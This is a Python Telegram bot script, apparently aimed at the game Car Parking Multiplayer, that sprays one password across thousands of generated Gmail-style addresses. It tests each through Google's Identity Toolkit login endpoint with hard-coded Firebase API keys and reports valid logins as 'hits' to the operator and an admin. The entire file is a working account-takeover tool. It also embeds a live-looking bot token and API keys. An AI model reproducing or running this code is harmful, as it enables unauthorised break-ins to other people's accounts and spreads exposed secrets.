import telebot
import requests
from telebot import types
from threading import Thread
from flask import Flask
import os
from concurrent.futures import ThreadPoolExecutor

# --- RENDER WEB SERVER ---
app = Flask('')
@app.route('/')
def home(): return "⚡ SCANNER WITH PROGRESS ACTIVE"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- CONFIG ---
TOKEN = "8574711169:AAGk87biel9UdUGxFTq9cDW4yOIiz6egRew"
bot = telebot.TeleBot(TOKEN)

ADMIN_ID = 7212602902
API_KEYS = {
    "CPM1": "AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA", 
    "CPM2": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
}

user_states = {}
session = requests.Session()

def login_acc(email, password):
    try:
        url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={API_KEYS['CPM2']}"
        r = session.post(url, json={"email": email, "password": password, "returnSecureToken": True}, timeout=5)
        return email if r.status_code == 200 else None
    except: return None

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id != ADMIN_ID: return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🚀 Turbo Recovery")
    bot.send_message(message.chat.id, "🔥 **FLAME TURBO MASTER ACTIVE**", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == "🚀 Turbo Recovery")
def ask_format(message):
    msg = bot.send_message(message.chat.id, "📧 **Format അയക്കുക:**\n(Ex: `cpmegy_{}_@gmail.com`)")
    bot.register_next_step_handler(msg, get_range)

def get_range(message):
    user_states[message.chat.id] = {'format': message.text.strip()}
    msg = bot.send_message(message.chat.id, "🔢 **Range അയക്കുക:**\n(Ex: `1000:100000`)")
    bot.register_next_step_handler(msg, get_pass)

def get_pass(message):
    try:
        s, e = map(int, message.text.split(':'))
        user_states[message.chat.id]['s'], user_states[message.chat.id]['e'] = s, e
        msg = bot.send_message(message.chat.id, "🔑 **Password അയക്കുക:**")
        bot.register_next_step_handler(msg, start_scan)
    except:
        bot.send_message(message.chat.id, "❌ Invalid Range Format!")

def start_scan(message):
    cid = message.chat.id
    pwd = message.text.strip()
    data = user_states.get(cid)
    
    start_val = data['s']
    end_val = data['e']
    total_to_check = end_val - start_val + 1
    
    bot.send_message(cid, f"🚀 **Scanning {total_to_check} accounts...**")

    def run():
        found_total = 0
        batch_size = 1000 # ഓരോ 1000 അക്കൗണ്ട് കഴിയുമ്പോഴും അറിയിക്കാൻ
        
        for i in range(start_val, end_val + 1, batch_size):
            current_end = min(i + batch_size - 1, end_val)
            emails_batch = [data['format'].replace("{}", str(n)) for n in range(i, current_end + 1)]
            
            with ThreadPoolExecutor(max_workers=50) as executor:
                hits = list(filter(None, executor.map(lambda e: login_acc(e, pwd), emails_batch)))
            
            for h in hits:
                found_total += 1
                bot.send_message(cid, f"✅ **HIT:** `{h}`")
                bot.send_message(ADMIN_ID, f"🔔 **LOG:** `{h}` Found!")
            
            # Progress Message അയക്കുന്നു
            bot.send_message(cid, f"📊 **Progress:** {current_end} reached... (Found: {found_total})")

        bot.send_message(cid, f"🏁 **Done! Total Hits: {found_total}**")

    Thread(target=run).start()

if __name__ == "__main__":
    Thread(target=run_flask).start()
    bot.infinity_polling(skip_pending=True)
